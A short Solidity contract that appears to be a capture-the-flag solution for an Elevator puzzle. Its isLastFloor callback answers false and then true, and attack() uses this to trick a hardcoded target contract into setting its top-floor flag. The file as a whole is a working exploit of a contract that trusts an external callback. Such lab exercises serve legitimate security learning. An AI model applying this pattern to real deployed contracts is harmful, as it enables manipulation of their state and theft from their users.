// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Elevator.sol";

contract Building {
    Elevator elevator;
    uint count = 0;

    function isLastFloor(uint256 _floor) external returns (bool) {
        if (count != 0) {
            return true;
        }
        else {
            count += 1;
            return false;
        }
    }

    function attack() public {
        elevator = Elevator(0xb1E5B93e64c1dDd81ba0BBD101C04123893ec6aA);
        elevator.goTo(1);
    }
}
